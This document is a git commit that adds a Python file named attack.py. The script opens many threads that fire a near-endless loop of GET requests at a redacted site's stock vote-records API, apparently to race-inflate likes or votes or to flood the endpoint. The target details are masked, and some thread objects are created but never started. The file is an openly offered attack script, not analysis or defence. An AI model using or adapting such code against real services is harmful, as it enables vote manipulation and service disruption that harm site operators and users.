db42402d8e06454aab69e55b448aa808f078fc8f
NCNIPC梅苑 <64565724+xulei1112@users.noreply.github.com>
2024-04-11 11:01:16 +0800

    Create attack.py

---
+++ attack.py
@@ -0,0 +1,112 @@
+import requests
+from threading import Thread
+import _thread
+import time
+import requests
+import threading
+
+
+url1="https://********.com/vapi/v1/stockvoterecords"
+params1 = {
+*******
+}
+params2 = {
+*******
+}
+
+headers1 = {
+   **********
+}
+
+
+def get2():
+    r = requests.get(url1,params=params2, headers=headers1)
+
+def bingfadianzan():
+        r = requests.get(url1,params=params1, headers=headers1)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+        threading.Thread(target=bingfadianzan)
+def bingfaquxiaodianzan():
+        r = requests.get(url1,params=params2, headers=headers1)
+        threading.Thread(target=bingfaquxiaodianzan)
+if __name__ == '__main__':
+  print("Threading ready:")
+  for i in range(0,10000000000000000):
+    t = threading.Thread(target=bingfadianzan)
+    t.setDaemon(True)
+    t.start()
+    t28 = threading.Thread(target=bingfadianzan)
+    t28.start()
+    t29 = threading.Thread(target=bingfadianzan)
+    t29.start()
+    t30 = threading.Thread(target=bingfadianzan)
+    t30.start()
+    t31 = threading.Thread(target=bingfadianzan)
+    t31.start()
+    t45 = threading.Thread(target=bingfaquxiaodianzan)
+    t45.start()
+    t32 = threading.Thread(target=bingfadianzan)
+    t32.start()
+    t33 = threading.Thread(target=bingfadianzan)
+    t33.start()
+    t1 = threading.Thread(target=bingfadianzan)
+    t1.start()
+    t2 = threading.Thread(target=bingfadianzan)
+    t2.start()
+    t14 = threading.Thread(target=bingfaquxiaodianzan)
+    t14.start()
+    t3 = threading.Thread(target=bingfadianzan)
+    t3.start()
+    t5 = threading.Thread(target=bingfadianzan)
+    t5.start()
+    t6 = threading.Thread(target=bingfadianzan)
+    t6.start()
+    t15 = threading.Thread(target=bingfaquxiaodianzan)
+    t15.start()
+    t7 = threading.Thread(target=bingfadianzan)
+    t7.start()
+    t8 = threading.Thread(target=bingfadianzan)
+    t8.start()
+    t9 = threading.Thread(target=bingfadianzan)
+    t9.start()
+    t10 = threading.Thread(target=bingfadianzan)
+    t10.start()
+    t11 = threading.Thread(target=bingfadianzan)
+    t11.start()
+    t20 = threading.Thread(target=bingfadianzan)
+    t20.start()
+    t12 = threading.Thread(target=bingfaquxiaodianzan)
+    t12.start()
+    t22 = threading.Thread(target=bingfadianzan)
+    t22.start()
+    t23 = threading.Thread(target=bingfadianzan)
+    t23.start()
+    t24 = threading.Thread(target=bingfadianzan)
+    t24.start()
+    t25 = threading.Thread(target=bingfadianzan)
+    t25.start()
+    t26 = threading.Thread(target=bingfadianzan)
+    t26.start()
+    t27 = threading.Thread(target=bingfadianzan)
+    t27.start()
+    t44 = threading.Thread(target=bingfaquxiaodianzan)
+    t44.start()
+  print("Threading ran end!")
